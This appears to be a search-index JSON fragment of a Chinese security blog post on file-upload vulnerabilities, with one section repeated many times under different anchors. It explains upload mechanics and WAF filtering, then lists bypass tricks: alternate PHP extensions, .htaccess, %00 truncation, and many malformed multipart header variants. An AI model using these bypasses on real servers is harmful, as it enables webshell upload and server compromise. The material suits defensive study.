boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#6waf如何拦截恶意文件"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#7绕过"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#黑名单绕过"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#白名单绕过"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#字符变异"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等 b.上传.htacess c.pHp大小写变换 d.在数据包中 后文件缀名前加空格 e.后缀名前加. f.加上::$DATA g.未循环验证，可以使用x.php…类似的方法 白名单绕过（一般需要配合其他漏洞一起利用） a.%00截断 在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。 %00适用于php\u003e5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断 （magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误） 字符变异\r引号变换头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号. Content-Disposition: \"form-data\"; name=file_x; filename=\"xx.php\" Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php Content-Disposition: form-data; name=\"file_x\"; filename='xx.php Content-Disposition: form-data; name=\"file_x\"; filename=\"xx.php; 大小写变换对关键字符进行大小写转换 Content-Disposition name filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition 添加换行符字符值与等号之间可以加入换行符,依然可以正常上传,如使用 Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\" Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]\"xx.php\"[0x09] Content-Disposition: \"form-data\"; name=\"file_x\"; filename=[0x09]xx.php[0x09]; 多个分号文件解析时,可能因为分号解析不到文件名,导致绕过 Content-Disposition: form-data; name=\"file_x\";;; filename=\"test.php\" 多个等号在post中的内容中使用多个等号对文件上传没有影响 Content-Disposition: form-data; name==\"file_x\"; filename====\"test.php\" 变换Content-Disposition的值在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空 Content-Disposition: fOrM-DaTA; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-da+ta; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: fo r m-dat a; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: form-dataxx; name=\"file_x\"; filename=\"xx.php\" Content-Disposition: name=\"file_x\"; filename=\"xx.php\" 畸形的boundary头部boundary可以变换为如下形式,且不影响上传 multipart/form-data大小写变换 Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值 Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data a\\|/?!@#$%^() boundary=----WebKitFormBoundarye111 multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值 Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,a\\|/?!@#$%^(),boundary=----WebKitFormBoundarye111 boundary之前可以直接加入任何值(php可行) Content-Type: multipart/form-data;bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 Content-Type: multipart/form-data,bypass\u0026123**{|}boundary=----WebKitFormBoundarye111 boundary末尾可以使用逗号或者分号隔开插入任何值 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc 顺序颠倒交换name和filename的顺序 因为规定了Content-Disposition必须在最前面,所以只能交换","date":"2023-11-17","objectID":"/hvv_owasptop10/:4:0","series":null,"tags":["hvv"],"title":"hvv_OWASP_TOP10","uri":"/hvv_owasptop10/#引号变换"},{"categories":["hvv"],"content":"\r05-文件上传漏洞：\r1.文件上传原理 用户在 Web 页面上选择要上传的文件，并提交表单。 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。 Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。 服务器返回上传结果给客户端，告知用户文件是否上传成功。 2.漏洞原理：由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器. 3.攻击特征文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录 4.需满足条件首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功 5.数据包中可修改的地方 Content-Disposition 一般可以更改 name 表单参数值. 不能更改filename :文件名 可以更改Content-Type:文件MIME 视情况更改boundary:内容划分,可以更改 6.waf如何拦截恶意文件 文件名:解析文件名,判断是否在黑名单内 文件内容:解析文件内容,判断是否为webshell 文件目录权限:这个由主机waf实现 获取Request Header中Content-Type的boundary值 根据boundary值,解析post数据,获取文件名 判断文件名是否在拦截黑名单/白名单之外 7.绕过\r黑名单绕过a.通过一些特殊后缀 .php5 